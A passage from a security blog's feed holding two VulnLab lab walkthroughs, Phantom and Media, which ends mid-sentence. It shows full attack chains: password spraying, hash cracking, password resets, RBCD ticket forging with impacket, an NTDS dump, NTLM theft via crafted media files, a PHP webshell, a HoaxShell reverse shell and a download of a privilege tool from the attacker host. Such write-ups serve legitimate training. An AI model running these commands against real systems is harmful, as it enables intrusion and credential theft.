class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">DC$</span><br><span class="line">svc_sspr</span><br><span class="line">rnichols</span><br><span class="line">pharrison</span><br><span class="line">wsilva</span><br><span class="line">elynch</span><br><span class="line">nhamilton</span><br><span class="line">lstanley</span><br><span class="line">bbarnes</span><br><span class="line">cjones</span><br><span class="line">agarcia</span><br><span class="line">ppayne</span><br><span class="line">ibryant</span><br><span class="line">ssteward</span><br><span class="line">wstewart</span><br><span class="line">vhoward</span><br><span class="line">crose</span><br><span class="line">twright</span><br><span class="line">fhanson</span><br><span class="line">cferguson</span><br><span class="line">alucas</span><br><span class="line">ebryant</span><br><span class="line">vlynch</span><br><span class="line">ghall</span><br><span class="line">ssimpson</span><br><span class="line">ccooper</span><br><span class="line">vcunningham</span><br></pre></td></tr></table></figure><h2 id="Password-Spraying"><a href="#Password-Spraying" class="headerlink" title="Password Spraying"></a>Password Spraying</h2><p>I performed a password spray using the default onboarding password:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb phantom.vl -u usernames.txt -p &#x27;Ph4nt0m@5t4rt!&#x27; --continue-on-success</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/foothold.png" alt="Successful Password Spray"><br>I found one user who hadn’t changed their default password:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ibryant:Ph4nt0m@5t4rt!</span><br></pre></td></tr></table></figure><h2 id="Privilege-Escalation-Path"><a href="#Privilege-Escalation-Path" class="headerlink" title="Privilege Escalation Path"></a>Privilege Escalation Path</h2><p>Using the compromised account, I checked for additional share access:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb phantom.vl -u ibryant -p &#x27;Ph4nt0m@5t4rt!&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/more_access.png" alt="Additional Share Access"><br>I now had access to the “Departments Share” as well as NETLOGON and SYSVOL. I explored the new share:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.122.37/&#x27;Departments Share&#x27; -U ibryant</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/departments_share.png" alt="Departments Share Contents"><br>I attempted to download all files recursively:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">recurse ON</span><br><span class="line">prompt OFF</span><br><span class="line">mget *</span><br></pre></td></tr></table></figure><p>This failed due to large files in the IT share, so I specifically targeted the backup file:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.122.37/&#x27;Departments Share&#x27; -U ibryant -c &#x27;timeout 120; iosize 16384; get \IT\Backup\IT_BACKUP_201123.hc&#x27;</span><br></pre></td></tr></table></figure><h2 id="Cracking-the-Encrypted-Backup"><a href="#Cracking-the-Encrypted-Backup" class="headerlink" title="Cracking the Encrypted Backup"></a>Cracking the Encrypted Backup</h2><p>The backup file was encrypted with VeraCrypt. To crack it, I first extracted the hash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=./it.hc of=./hash bs=512 count=1</span><br></pre></td></tr></table></figure><p>I attempted to crack it with standard wordlists:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13722 -a 0 hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>When that failed, I created a custom wordlist and rule file:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cat phantom.txt</span><br><span class="line">phantom</span><br><span class="line">Phantom</span><br><span class="line">PHANTOM</span><br><span class="line">PHANT0M</span><br><span class="line">phant0m</span><br><span class="line">phantom.vl</span><br><span class="line">PHANTOM.VL</span><br><span class="line">phant0m.vl</span><br><span class="line">PHANT0M.vl</span><br><span class="line">Ph4nt0m</span><br><span class="line">PH4NT0M</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat phantom.rule </span><br><span class="line">$2 $0 $2 $3 $$</span><br><span class="line">$2 $0 $2 $3 $&amp;</span><br><span class="line">$2 $0 $2 $3 $@</span><br><span class="line">$2 $0 $2 $3 $!</span><br><span class="line">$2 $0 $2 $3 $#</span><br><span class="line">$2 $0 $2 $3 $%</span><br><span class="line">$2 $0 $2 $3 $^</span><br><span class="line">$2 $0 $2 $3 $*</span><br><span class="line">$2 $0 $2 $3 $(</span><br><span class="line">$2 $0 $2 $3 $)</span><br><span class="line">$2 $0 $2 $3 $-</span><br><span class="line">$2 $0 $2 $3 $_</span><br><span class="line">$2 $0 $2 $3 $=</span><br><span class="line">$2 $0 $2 $3 $+</span><br></pre></td></tr></table></figure><p>I ran hashcat with the custom wordlist and rules:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 13721 it.hc phantom.txt -r phantom.rule</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/cracked_hash.png" alt="Cracked Hash"></p><p>The password was cracked:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">it.hc:&lt;NOPE&gt;</span><br></pre></td></tr></table></figure><h2 id="Analyzing-Encrypted-Contents"><a href="#Analyzing-Encrypted-Contents" class="headerlink" title="Analyzing Encrypted Contents"></a>Analyzing Encrypted Contents</h2><p>I mounted the encrypted volume:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">veracrypt it.hc</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/veracrypt.png" alt="VeraCrypt Mount"><br>After searching through the files, I found credentials for user <code>lstanley</code> in <code>/config/config.boot</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vpn &#123;</span><br><span class="line">    sstp &#123;</span><br><span class="line">        authentication &#123;</span><br><span class="line">            local-users &#123;</span><br><span class="line">                username lstanley &#123;</span><br><span class="line">                    password &quot;PASS&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            mode &quot;local&quot;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h2 id="Further-Account-Compromise"><a href="#Further-Account-Compromise" class="headerlink" title="Further Account Compromise"></a>Further Account Compromise</h2><p>I checked if any service accounts used the same password:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb phantom.vl -u usernames.txt -p &#x27;&#x27; --shares --continue-on-success</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/service.png" alt="Service Account Access"><br>I confirmed we had WinRM access with these credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec winrm phantom.vl -u svc_sspr -p &#x27;&#x27;</span><br></pre></td></tr></table></figure><h2 id="BloodHound-Analysis"><a href="#BloodHound-Analysis" class="headerlink" title="BloodHound Analysis"></a>BloodHound Analysis</h2><p>I used BloodHound to map potential attack paths:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.108.178 -u svc_sspr -p &#x27;&#x27; --bloodhound --dns-server 10.10.108.178 -c All --dns-tcp</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/forcechange.png" alt="ForceChangePassword Permission"><br>I discovered that users in the ICT Security group had <code>AddAllowedToAct</code> permissions:<br><img src="/images/Phantom/path.png" alt="Attack Path"><br>I checked if we could add new computers to the domain:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.108.178 -u svc_sspr -p &#x27;PASS&#x27; -M maq</span><br></pre></td></tr></table></figure><p>The result showed <code>MachineAccountQuota: 0</code>, meaning we couldn’t add new computer accounts.</p><h2 id="Compromising-Additional-Users"><a href="#Compromising-Additional-Users" class="headerlink" title="Compromising Additional Users"></a>Compromising Additional Users</h2><p>Using the ForceChangePassword privilege, I reset passwords for several users:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net rpc password &quot;crose&quot; &quot;newP@ssword2022&quot; -U &quot;phantom.vl&quot;/&quot;svc_sspr&quot;%&#x27;PASS&#x27; -S DC.phantom.vl</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net rpc password &quot;wsilva&quot; &quot;newP@ssword2022&quot; -U &quot;phantom.vl&quot;/&quot;svc_sspr&quot;%&#x27;PASS&#x27; -S DC.phantom.vl</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net rpc password &quot;rnichols&quot; &quot;newP@ssword2022&quot; -U &quot;phantom.vl&quot;/&quot;svc_sspr&quot;%&#x27;PASS&#x27; -S DC.phantom.vl</span><br></pre></td></tr></table></figure><p>I checked if any of these users could add machines to the domain:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.108.178 -u usernames-p &#x27;newP@ssword2022&#x27; -M maq</span><br></pre></td></tr></table></figure><p>None of them had this privilege.</p><h2 id="Resource-Based-Constrained-Delegation-RBCD-Attack"><a href="#Resource-Based-Constrained-Delegation-RBCD-Attack" class="headerlink" title="Resource-Based Constrained Delegation (RBCD) Attack"></a>Resource-Based Constrained Delegation (RBCD) Attack</h2><p>Since we couldn’t add computer accounts, I had to leverage RBCD on SPN-less users. The process involves:</p><ol><li>Obtaining a TGT for the SPN-less user allowed to delegate to a target and retrieving the TGT session key</li><li>Changing the user’s password hash to match the TGT session key</li><li>Combining S4U2self and U2U to obtain a service ticket to the target on behalf of a more privileged user</li><li>Using the ticket to access the target as the delegated user</li></ol><p>I chose to use the <code>wsilva</code> account for this attack:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-rbcd -delegate-from &#x27;wsilva&#x27; -delegate-to &#x27;DC$&#x27; -dc-ip &#x27;10.10.108.178&#x27; -action &#x27;write&#x27; &#x27;phantom.vl&#x27;/&#x27;wsilva&#x27;:&#x27;newP@ssword2022&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/wsilva.png" alt="RBCD Configuration"><br>Next, I obtained a TGT through overpass-the-hash to use RC4:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getTGT -hashes :$(pypykatz crypto nt &#x27;newP@ssword2022&#x27;) &#x27;phantom.vl&#x27;/&#x27;wsilva&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=wsilva.ccache</span><br></pre></td></tr></table></figure><p>I extracted the TGT session key:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">impacket-describeTicket wsilva.ccache | grep &#x27;Ticket Session Key&#x27;</span><br><span class="line">[*] Ticket Session Key            : 08d09e30adcdade32338f3241b5b183d</span><br></pre></td></tr></table></figure><p>Then I changed the user’s NT hash to match the TGT session key:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-changepasswd -newhashes :08d09e30adcdade32338f3241b5b183d &#x27;phantom.vl&#x27;/&#x27;wsilva&#x27;:&#x27;newP@ssword2022&#x27;@&#x27;DC.phantom.vl&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/wsilva_pass.png" alt="Password Change"><br>With this setup complete, I obtained a delegated service ticket through S4U2self+U2U, followed by S4U2proxy:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getST -k -no-pass -u2u -impersonate &quot;Administrator&quot; -spn &quot;cifs/DC.phantom.vl&quot; &#x27;phantom.vl&#x27;/&#x27;wsilva&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/administrator_ccache.png" alt="Administrator Ticket"><br>I set the Kerberos ticket for use:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache</span><br></pre></td></tr></table></figure><p>Finally, I was able to access domain controller resources as Administrator:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb DC.phantom.vl --use-kcache --ntds</span><br></pre></td></tr></table></figure><p>And establish a shell with the compromised Administrator hash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i phantom.vl -u Administrator -H &lt;HASH&gt;</span><br></pre></td></tr></table></figure><p><a href="https://api.vulnlab.com/api/v1/share?id=3c11f61d-bbef-4060-a25c-218e7e931b55">https://api.vulnlab.com/api/v1/share?id=3c11f61d-bbef-4060-a25c-218e7e931b55</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VulnLab </tag>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Media</title>
      <link href="/2025/04/04/VL-Media/"/>
      <url>/2025/04/04/VL-Media/</url>
      
        <content type="html"><![CDATA[<h1 id="VL-Media-Windows-Media-Player-NTLM-Theft-and-Junction-Folder-Exploitation-Walkthrough"><a href="#VL-Media-Windows-Media-Player-NTLM-Theft-and-Junction-Folder-Exploitation-Walkthrough" class="headerlink" title="VL-Media: Windows Media Player NTLM Theft and Junction Folder Exploitation Walkthrough"></a>VL-Media: Windows Media Player NTLM Theft and Junction Folder Exploitation Walkthrough</h1><p>This detailed Vulnlab - Hack The Box penetration testing walkthrough demonstrates how I successfully compromised a Windows media server through a creative combination of attack vectors. Beginning with reconnaissance that revealed a vulnerable file upload functionality in a web application specifically requesting “Windows Media Player compatible” files, I leveraged NTLM theft techniques by crafting malicious media files (.wax and .asx) to capture and crack the user’s credentials. After gaining initial SSH access, I discovered an automated script that processes uploaded files, which led to identifying a critical path traversal vulnerability using Windows junction points. By redirecting the upload path to the web server’s document root, I deployed a PHP webshell that provided remote code execution capabilities. The privilege escalation phase involved restoring SeImpersonate privileges with FullPowers and ultimately achieving SYSTEM-level access. This technical guide illustrates advanced Windows exploitation techniques including symbolic link abuse, service account manipulation, and privilege escalation methods essential for thorough penetration testing of Windows environments.</p><h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><p>Initial port scan revealed the following open ports:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">22/tcp   open  ssh           syn-ack ttl 127 OpenSSH </span><br><span class="line">80/tcp   open  http          syn-ack ttl 127 Apache httpd </span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br></pre></td></tr></table></figure><p><img src="/images/Media/media_player.png" alt="Windows Media Player Upload Interface"></p><h2 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h2><p>The target website featured an upload function requesting a “brief introduction video (compatible with Windows Media Player)”. This presented an opportunity to leverage NTLM hash theft.</p><h3 id="NTLM-Theft-Technique"><a href="#NTLM-Theft-Technique" class="headerlink" title="NTLM Theft Technique"></a>NTLM Theft Technique</h3><p>Using <a href="https://github.com/Greenwolf/ntlm_theft">ntlm_theft</a> to create malicious media files:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- .wax - via Windows Media Player playlist (Better, primary open)</span><br><span class="line">- .asx – via Windows Media Player playlist (Better, primary open)</span><br><span class="line">- .m3u – via Windows Media Player playlist (Worse, Win10 opens first in Groovy)</span><br></pre></td></tr></table></figure><p>I uploaded a <code>.wax</code> or <code>.asx</code> file to the target and set up Responder to capture the NTLM hash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0 -dwv</span><br></pre></td></tr></table></figure><p><img src="/images/Media/ntlm_hash.png" alt="NTLM Hash Captured"></p><h3 id="Password-Cracking"><a href="#Password-Cracking" class="headerlink" title="Password Cracking"></a>Password Cracking</h3><p>Once I captured the hash, I used hashcat to crack it:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash6969.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="/images/Media/cracked_hash.png" alt="Cracked Hash"><br>Credentials obtained: </p><ul><li>Username: ENOX</li><li>Password: &lt;&gt;</li></ul><h2 id="System-Access"><a href="#System-Access" class="headerlink" title="System Access"></a>System Access</h2><p>With the credentials, I established an SSH connection:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh enox@10.10.109.139</span><br></pre></td></tr></table></figure><h2 id="Privilege-Escalation-Research"><a href="#Privilege-Escalation-Research" class="headerlink" title="Privilege Escalation Research"></a>Privilege Escalation Research</h2><p>Upon accessing the system, I discovered a PowerShell script that revealed key information about the system’s operation:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">enox@MEDIA C:\Users\enox\Documents&gt;type review.ps1</span><br><span class="line">function Get-Values &#123;</span><br><span class="line">    param (</span><br><span class="line">        [Parameter(Mandatory = $true)]</span><br><span class="line">        [ValidateScript(&#123;Test-Path -Path $_ -PathType Leaf&#125;)]</span><br><span class="line">        [string]$FilePath</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    # Read the first line of the file</span><br><span class="line">    $firstLine = Get-Content $FilePath -TotalCount 1</span><br><span class="line"></span><br><span class="line">    # Extract the values from the first line</span><br><span class="line">    if ($firstLine -match &#x27;Filename: (.+), Random Variable: (.+)&#x27;) &#123;</span><br><span class="line">        $filename = $Matches[1]</span><br><span class="line">        $randomVariable = $Matches[2]</span><br><span class="line"></span><br><span class="line">        # Create a custom object with the extracted values</span><br><span class="line">        $repoValues = [PSCustomObject]@&#123;</span><br><span class="line">            FileName = $filename</span><br><span class="line">            RandomVariable = $randomVariable</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # Return the custom object</span><br><span class="line">        return $repoValues</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        # Return $null if the pattern is not found</span><br><span class="line">        return $null</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function UpdateTodo &#123;</span><br><span class="line">    param (</span><br><span class="line">        [Parameter(Mandatory = $true)]</span><br><span class="line">        [ValidateScript(&#123;Test-Path -Path $_ -PathType Leaf&#125;)]</span><br><span class="line">        [string]$FilePath</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    # Create a .NET stream reader and writer</span><br><span class="line">    $reader = [System.IO.StreamReader]::new($FilePath)</span><br><span class="line">    $writer = [System.IO.StreamWriter]::new($FilePath + &quot;.tmp&quot;)</span><br><span class="line"></span><br><span class="line">    # Read the first line and ignore it</span><br><span class="line">    $reader.ReadLine() | Out-Null</span><br><span class="line"></span><br><span class="line">    # Copy the remaining lines to a temporary file</span><br><span class="line">    while (-not $reader.EndOfStream) &#123;</span><br><span class="line">        $line = $reader.ReadLine()</span><br><span class="line">        $writer.WriteLine($line)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # Close the reader and writer</span><br><span class="line">    $reader.Close()</span><br><span class="line">    $writer.Close()</span><br><span class="line"></span><br><span class="line">    # Replace the original file with the temporary file</span><br><span class="line">    Remove-Item $FilePath</span><br><span class="line">    Rename-Item -Path ($FilePath + &quot;.tmp&quot;) -NewName $FilePath</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$todofile=&quot;C:\\Windows\\Tasks\\Uploads\\todo.txt&quot;</span><br><span class="line">$mediaPlayerPath = &quot;C:\Program Files (x86)\Windows Media Player\wmplayer.exe&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while($True)&#123;</span><br><span class="line"></span><br><span class="line">    if ((Get-Content -Path $todofile) -eq $null) &#123;</span><br><span class="line">        Write-Host &quot;Todo is empty.&quot;</span><br><span class="line">        Sleep 60 # Sleep for 60 seconds before rechecking</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        $result = Get-Values -FilePath $todofile</span><br><span class="line">        $filename = $result.FileName</span><br><span class="line">        $randomVariable = $result.RandomVariable</span><br><span class="line">        Write-Host &quot;FileName: $filename&quot;</span><br><span class="line">        Write-Host &quot;Random Variable: $randomVariable&quot;</span><br><span class="line"></span><br><span class="line">        # Opening the File in Windows Media Player</span><br><span class="line">        Start-Process -FilePath $mediaPlayerPath -ArgumentList &quot;C:\Windows\Tasks\uploads\$randomVariable\$filename&quot;</span><br><span class="line"></span><br><span class="line">        # Wait for 15 seconds</span><br><span class="line">        Start-Sleep -Seconds 15</span><br><span class="line"></span><br><span class="line">        $mediaPlayerProcess = Get-Process -Name &quot;wmplayer&quot; -ErrorAction SilentlyContinue</span><br><span class="line">        if ($mediaPlayerProcess -ne $null) &#123;</span><br><span class="line">            Write-Host &quot;Killing Windows Media Player process.&quot;</span><br><span class="line">            Stop-Process -Name &quot;wmplayer&quot; -Force</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # Task Done</span><br><span class="line">        UpdateTodo -FilePath $todofile # Updating C:\Windows\Tasks\Uploads\todo.txt</span><br><span class="line">        Sleep 15</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Path-Traversal-Exploitation"><a href="#Path-Traversal-Exploitation" class="headerlink" title="Path Traversal Exploitation"></a>Path Traversal Exploitation</h2><p>I discovered a junction abuse vulnerability in the <code>C:\Windows\Tasks\Uploads\</code> directory. The system creates MD5 hashes from the “firstnamelastnameemail” of data input to the website during uploads.</p><h3 id="Creating-a-Webshell"><a href="#Creating-a-Webshell" class="headerlink" title="Creating a Webshell"></a>Creating a Webshell</h3><p>First, I created a simple PHP webshell:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">  </span><br><span class="line">system($_REQUEST[&#x27;cmd&#x27;]);  </span><br><span class="line">  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>I then calculated the MD5 hash that would be created:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -n &quot;carlitocarlitocarlito@media.vl&quot; | md5sum</span><br><span class="line">3aab4336940e9c82d5ef05bf40d58b52  -</span><br></pre></td></tr></table></figure><p><img src="/images/Media/file_made.png" alt="File Created"><br>After verifying the hash calculation worked correctly, I deleted the folder and created a junction pointing to <code>C:\xampp\htdocs</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmdir C:\Windows\Tasks\Uploads\3aab4336940e9c82d5ef05bf40d58b52</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mklink /J C:\Windows\Tasks\Uploads\3aab4336940e9c82d5ef05bf40d58b52 C:\xampp\htdocs</span><br></pre></td></tr></table></figure><p>After re-uploading the file, the webshell appeared in <code>C:\xampp\htdocs</code>:<br><img src="/images/Media/shell_in_website.png" alt="Shell in Website"></p><h2 id="Gaining-System-Access"><a href="#Gaining-System-Access" class="headerlink" title="Gaining System Access"></a>Gaining System Access</h2><p>I created a HoaxShell session and executed the provided command through our webshell:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hoaxshell -s 10.8.5.195 --p 4444</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/phpshell.php?cmd=powershell -e ......</span><br></pre></td></tr></table></figure><p><img src="/images/Media/hoaxshell.png" alt="HoaxShell Connection"><br>I noticed we were running as the Local Service account but without the impersonate privilege. To restore these privileges, I used <a href="https://github.com/itm4n/FullPowers/releases/tag/v0.1">FullPowers</a>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.8.5.195/FullPowers.exe -o FS.exe</span><br></pre></td></tr></table></figure><p>I then created another HoaxShell and executed FullPowers:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./FS.exe -c &quot;powershell -e .....</span><br></pre></td></tr></table></figure><p><img src="/images/Media/seimpersonate.png" alt="SeImpersonate Privilege"></p><h2 id="Privilege-Escalation-to-SYSTEM"><a href="#Privilege-Escalation-to-SYSTEM" class="headerlink" title="Privilege Escalation to SYSTEM"></a>Privilege Escalation to SYSTEM</h2><p>To escalate to SYSTEM, I used the Meterpreter <code>getsystem</code> command (alternatively, any potato exploit would 